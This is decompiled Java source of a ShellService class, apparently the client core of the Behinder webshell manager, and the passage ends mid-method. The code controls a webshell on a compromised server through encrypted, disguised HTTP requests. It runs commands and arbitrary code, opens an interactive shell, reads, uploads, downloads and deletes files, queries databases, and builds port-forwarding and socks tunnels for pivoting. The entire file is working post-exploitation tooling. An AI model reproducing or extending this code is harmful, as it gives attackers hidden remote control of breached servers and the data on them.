// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.core;

import javafx.stage.WindowEvent;
import javafx.application.Platform;
import javafx.stage.Window;
import javafx.scene.control.Alert;
import java.io.FileOutputStream;
import java.util.Iterator;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import java.util.LinkedHashMap;
import java.security.SecureRandom;
import net.rebeyond.behinder.utils.Utils;
import java.util.Set;
import java.util.List;
import java.util.Collection;
import java.util.HashSet;
import java.util.Arrays;
import java.util.ArrayList;
import java.util.Random;
import java.util.HashMap;
import org.json.JSONObject;
import java.util.Map;

public class ShellService
{
    public String currentUrl;
    public String currentPassword;
    public String currentKey;
    public String currentType;
    public Map<String, String> currentHeaders;
    public int encryptType;
    public int beginIndex;
    public int endIndex;
    public JSONObject shellEntity;
    public static int BUFFSIZE;
    public static Map<String, Object> currentProxy;
    
    public ShellService(final JSONObject shellEntity) throws Exception {
        this.encryptType = Constants.ENCRYPT_TYPE_AES;
        this.beginIndex = 0;
        this.endIndex = 0;
        this.shellEntity = shellEntity;
        this.currentUrl = shellEntity.getString("url");
        this.currentType = shellEntity.getString("type");
        this.currentPassword = shellEntity.getString("password");
        this.currentHeaders = new HashMap<String, String>();
        this.initHeaders();
        this.mergeHeaders(this.currentHeaders, shellEntity.getString("headers"));
    }
    
    private void initHeaders() {
        this.currentHeaders.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
        this.currentHeaders.put("Accept-Language", "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7");
        if (this.currentType.equals("php")) {
            this.currentHeaders.put("Content-Type", "text/html;charset=utf-8");
        }
        this.currentHeaders.put("User-Agent", this.getCurrentUserAgent());
    }
    
    private String getCurrentUserAgent() {
        final int uaIndex = new Random().nextInt(Constants.userAgents.length - 1);
        final String currentUserAgent = Constants.userAgents[uaIndex];
        return currentUserAgent;
    }
    
    public static void setProxy(final Map<String, Object> proxy) {
        ShellService.currentProxy = proxy;
    }
    
    public static Map<String, Object> getProxy(final Map<String, Object> proxy) {
        return ShellService.currentProxy;
    }
    
    public JSONObject getShellEntity() {
        return this.shellEntity;
    }
    
    private void mergeCookie(final Map<String, String> headers, final String cookie) {
        final List<String> newCookies = new ArrayList<String>();
        final String[] cookiePairs = cookie.split(";");
        for (int i = 0; i < cookiePairs.length; ++i) {
            final Set<String> cookiePropertyList = new HashSet<String>(Arrays.asList(Constants.cookieProperty));
            final String[] cookiePair = cookiePairs[i].split("=");
            if (cookiePair.length > 1) {
                final String cookieKey = cookiePair[0];
                if (!cookiePropertyList.contains(cookieKey.toLowerCase().trim())) {
                    newCookies.add(cookiePairs[i]);
                }
            }
        }
        final String newCookiesString = String.join(";", newCookies);
        if (headers.containsKey("Cookie")) {
            final String userCookie = headers.get("Cookie");
            headers.put("Cookie", userCookie + ";" + newCookiesString);
        }
        else {
            headers.put("Cookie", newCookiesString);
        }
    }
    
    private void mergeHeaders(final Map<String, String> headers, final String headerTxt) {
        for (final String line : headerTxt.split("\n")) {
            final int semiIndex = line.indexOf(":");
            if (semiIndex > 0) {
                String key = line.substring(0, semiIndex);
                key = this.formatHeaderName(key);
                final String value = line.substring(semiIndex + 1);
                if (!value.equals("")) {
                    headers.put(key, value);
                }
            }
        }
    }
    
    private String formatHeaderName(final String beforeName) {
        String afterName = "";
        for (String element : beforeName.split("-")) {
            element = (element.charAt(0) + "").toUpperCase() + element.substring(1).toLowerCase();
            afterName = afterName + element + "-";
        }
        if (afterName.length() - beforeName.length() == 1 && afterName.endsWith("-")) {
            afterName = afterName.substring(0, afterName.length() - 1);
        }
        return afterName;
    }
    
    public boolean doConnect() throws Exception {
        boolean result = false;
        this.currentKey = Utils.getKey(this.currentPassword);
        try {
            if (this.currentType.equals("php")) {
                try {
                    final int randStringLength = new SecureRandom().nextInt(3000);
                    final String content = Utils.getRandomString(randStringLength);
                    final JSONObject obj = this.echo(content);
                    if (obj.getString("msg").equals(content)) {
                        result = true;
                    }
                }
                catch (Exception e) {
                    this.encryptType = Constants.ENCRYPT_TYPE_XOR;
                    try {
                        final int randStringLength2 = new SecureRandom().nextInt(3000);
                        final String content2 = Utils.getRandomString(randStringLength2);
                        final JSONObject obj2 = this.echo(content2);
                        if (obj2.getString("msg").equals(content2)) {
                            result = true;
                        }
                    }
                    catch (Exception ex) {
                        this.encryptType = Constants.ENCRYPT_TYPE_AES;
                        throw ex;
                    }
                }
            }
            else {
                try {
                    if (this.currentType.equals("asp")) {
                        this.encryptType = Constants.ENCRYPT_TYPE_XOR;
                    }
                    final int randStringLength = new SecureRandom().nextInt(3000);
                    final String content = Utils.getRandomString(randStringLength);
                    final JSONObject obj = this.echo(content);
                    if (obj.getString("msg").equals(content)) {
                        result = true;
                    }
                }
                catch (Exception ex2) {
                    throw ex2;
                }
            }
        }
        catch (Exception e) {
            System.out.println("\u8fdb\u5165\u5e38\u89c4\u5bc6\u94a5\u534f\u5546\u6d41\u7a0b");
            final Map<String, String> keyAndCookie = Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders);
            final String cookie = keyAndCookie.get("cookie");
            if ((cookie == null || cookie.equals("")) && !this.currentHeaders.containsKey("cookie")) {
                final String urlWithSession = keyAndCookie.get("urlWithSession");
                if (urlWithSession != null) {
                    this.currentUrl = urlWithSession;
                }
                this.currentKey = Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders).get("key");
            }
            else {
                this.mergeCookie(this.currentHeaders, cookie);
                this.currentKey = keyAndCookie.get("key");
                if (this.currentType.equals("php") || this.currentType.equals("aspx")) {
                    this.beginIndex = Integer.parseInt(keyAndCookie.get("beginIndex"));
                    this.endIndex = Integer.parseInt(keyAndCookie.get("endIndex"));
                }
            }
            try {
                final int randStringLength3 = new SecureRandom().nextInt(3000);
                final String content3 = Utils.getRandomString(randStringLength3);
                final JSONObject obj3 = this.echo(content3);
                if (obj3.getString("msg").equals(content3)) {
                    result = true;
                }
            }
            catch (Exception ex3) {
                result = false;
            }
        }
        return result;
    }
    
    public String eval(final String sourceCode) throws Exception {
        String result = null;
        byte[] payload = null;
        if (this.currentType.equals("jsp")) {
            payload = Utils.getClassFromSourceCode(sourceCode);
        }
        else {
            payload = sourceCode.getBytes();
        }
        final byte[] data = Utils.getEvalData(this.currentKey, this.encryptType, this.currentType, payload);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        result = new String(resData);
        return result;
    }
    
    public JSONObject runCmd(final String cmd) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("cmd", cmd);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "Cmd", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject createBShell(final String target, final String localPort) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "create");
        params.put("target", target);
        params.put("localPort", localPort);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject sendBShellCommand(final String target, final String action, final String actionParams) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", action);
        params.put("target", target);
        params.put("params", actionParams);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject submitPluginTask(final String taskID, final String payloadPath, final Map<String, String> pluginParams) throws Exception {
        final byte[] pluginData = Utils.getPluginData(this.currentKey, this.encryptType, payloadPath, pluginParams, this.currentType);
        final Map<String, String> params = new HashMap<String, String>();
        params.put("taskID", taskID);
        params.put("action", "submit");
        params.put("payload", Base64.encode(pluginData));
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "Plugin", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject getPluginTaskResult(final String taskID) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("taskID", taskID);
        params.put("action", "getResult");
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "Plugin", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject loadJar(final String libPath) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("libPath", libPath);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "Loader", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject createRealCMD(final String bashPath) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", "create");
        params.put("bashPath", bashPath);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result;
        if (!this.currentType.equals("php")) {
            result = new JSONObject(resultTxt);
        }
        else {
            result = new JSONObject();
            result.put("status", (Object)Base64.encode("success".getBytes()));
        }
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject stopRealCMD() throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", "stop");
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result;
        if (!this.currentType.equals("php")) {
            result = new JSONObject(resultTxt);
        }
        else {
            result = new JSONObject();
            result.put("status", (Object)Base64.encode("success".getBytes()));
            result.put("msg", (Object)Base64.encode("msg".getBytes()));
        }
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject readRealCMD() throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", "read");
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject writeRealCMD(final String cmd) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", "write");
        if (this.currentType.equals("php")) {
            params.put("bashPath", "");
        }
        params.put("cmd", Base64.encode(cmd.getBytes()));
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject listFiles(final String path) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "list");
        params.put("path", path);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject deleteFile(final String path) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "delete");
        params.put("path", path);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject showFile(final String path, final String charset) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "show");
        params.put("path", path);
        if (this.currentType.equals("php")) {
            params.put("content", "");
        }
        else if (this.currentType.equals("asp")) {}
        if (charset != null) {
            params.put("charset", charset);
        }
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject renameFile(final String oldName, final String newName) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "rename");
        params.put("path", oldName);
        if (this.currentType.equals("php")) {
            params.put("content", "");
            params.put("charset", "");
        }
        params.put("newPath", newName);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject createFile(final String fileName) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "createFile");
        params.put("path", fileName);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject createDirectory(final String dirName) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "createDirectory");
        params.put("path", dirName);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public void downloadFile(final String remotePath, final String localPath) throws Exception {
        byte[] fileContent = null;
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "download");
        params.put("path", remotePath);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        fileContent = (byte[]) Utils.sendPostRequestBinary(this.currentUrl, this.currentHeaders, data).get("data");
        final FileOutputStream fso = new FileOutputStream(localPath);
        fso.write(fileContent);
        fso.flush();
        fso.close();
    }
    
    public JSONObject execSQL(final String type, final String host, final String port, final String user, final String pass, final String database, final String sql) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", type);
        params.put("host", host);
        params.put("port", port);
        params.put("user", user);
        params.put("pass", pass);
        params.put("database", database);
        params.put("sql", sql);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "Database", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject uploadFile(final String remotePath, final byte[] fileContent, final boolean useBlock) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        JSONObject result = null;
        if (!useBlock) {
            params.put("mode", "create");
            params.put("path", remotePath);
            params.put("content", Base64.encode(fileContent));
            final byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
            final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
            final byte[] resData = (byte[]) resultObj.get("data");
            final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
            result = new JSONObject(resultTxt);
            for (final String key : result.keySet()) {
                result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
            }
        }
        else {
            final List<byte[]> blocks = Utils.splitBytes(fileContent, ShellService.BUFFSIZE);
            for (int i = 0; i < blocks.size(); ++i) {
                if (i == 0) {
                    params.put("mode", "create");
                }
                else {
                    params.put("mode", "append");
                }
                params.put("path", remotePath);
                params.put("content", Base64.encode(blocks.get(i)));
                final byte[] data2 = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
                final Map<String, Object> resultObj2 = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data2, this.beginIndex, this.endIndex);
                final byte[] resData2 = (byte[]) resultObj2.get("data");
                final String resultTxt2 = new String(Crypt.Decrypt(resData2, this.currentKey, this.encryptType, this.currentType));
                result = new JSONObject(resultTxt2);
                for (final String key2 : result.keySet()) {
                    result.put(key2, (Object)new String(Base64.decode(result.getString(key2)), "UTF-8"));
                }
            }
        }
        return result;
    }
    
    public JSONObject uploadFile(final String remotePath, final byte[] fileContent) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "create");
        params.put("path", remotePath);
        params.put("content", Base64.encode(fileContent));
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public JSONObject appendFile(final String remotePath, final byte[] fileContent) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "append");
        params.put("path", remotePath);
        params.put("content", Base64.encode(fileContent));
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public boolean createRemotePortMap(final String targetIP, final String targetPort, final String remoteIP, final String remotePort) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "createRemote");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        if (this.currentType.equals("php")) {
            params.put("socketHash", "");
        }
        params.put("remoteIP", remoteIP);
        params.put("remotePort", remotePort);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
        final Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final Map<String, String> resHeader = (Map<String, String>) result.get("header");
        byte[] resData = (byte[]) result.get("data");
        if (!resHeader.get("status").equals("200")) {
            return false;
        }
        if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            throw new Exception(new String(resData));
        }
        return true;
    }
    
    public boolean createRemoteSocks(final String targetIP, final String targetPort, final String remoteIP, final String remotePort) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "createRemote");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("remoteIP", remoteIP);
        params.put("remotePort", remotePort);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
        final Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final Map<String, String> resHeader = (Map<String, String>) result.get("header");
        byte[] resData = (byte[]) result.get("data");
        if (!resHeader.get("status").equals("200")) {
            return false;
        }
        if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            throw new Exception(new String(resData));
        }
        return true;
    }
    
    public boolean createPortMap(final String targetIP, final String targetPort, final String socketHash) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "createLocal");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
        final Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final Map<String, String> resHeader = (Map<String, String>) result.get("header");
        byte[] resData = (byte[]) result.get("data");
        if (!resHeader.get("status").equals("200")) {
            return false;
        }
        if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            throw new Exception(new String(resData));
        }
        return true;
    }
    
    public byte[] readPortMapData(final String targetIP, final String targetPort, final String socketHash) throws Exception {
        byte[] resData = null;
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "read");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
        Map<String, Object> result = null;
        try {
            result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        }
        catch (Exception e) {
            final byte[] exceptionByte = e.getMessage().getBytes();
            if (exceptionByte[0] == 55 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 54) {
                resData = Arrays.copyOfRange(exceptionByte, 4, exceptionByte.length);
                throw new Exception(new String(resData, "UTF-8"));
            }
            throw e;
        }
        final Map<String, String> resHeader = (Map<String, String>) result.get("header");
        if (resHeader.get("status").equals("200")) {
            resData = (byte[]) result.get("data");
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
                return null;
            }
            if (resHeader.containsKey("server") && resHeader.get("server").indexOf("Apache-Coyote/1.1") > 0) {
                resData = Arrays.copyOfRange(resData, 0, resData.length - 1);
            }
            if (resData == null) {
                resData = new byte[0];
            }
        }
        else {
            resData = null;
        }
        return resData;
    }
    
    public boolean writePortMapData(final byte[] proxyData, final String targetIP, final String targetPort, final String socketHash) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "write");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        if (this.currentType.equals("php")) {
            params.put("remoteIP", "");
            params.put("remotePort", "");
        }
        params.put("extraData", Base64.encode(proxyData));
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
        final Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final Map<String, String> resHeader = (Map<String, String>) result.get("header");
        byte[] resData = (byte[]) result.get("data");
        if (!resHeader.get("status").equals("200")) {
            return false;
        }
        if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            return false;
        }
        return true;
    }
    
    public boolean closeLocalPortMap(final String targetIP, final String targetPort) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "closeLocal");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
        final Map<String, String> resHeader = (Map<String, String>) Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
        return resHeader.get("status").equals("200");
    }
    
    public boolean closeRemotePortMap() throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "closeRemote");
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
        final Map<String, String> resHeader = (Map<String, String>) Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
        return resHeader.get("status").equals("200");
    }
    
    public byte[] readProxyData() throws Exception {
        byte[] resData = null;
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("cmd", "READ");
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
        Map<String, Object> result = null;
        try {
            result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        }
        catch (Exception e) {
            final byte[] exceptionByte = e.getMessage().getBytes();
            if (exceptionByte[0] == 55 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 54) {
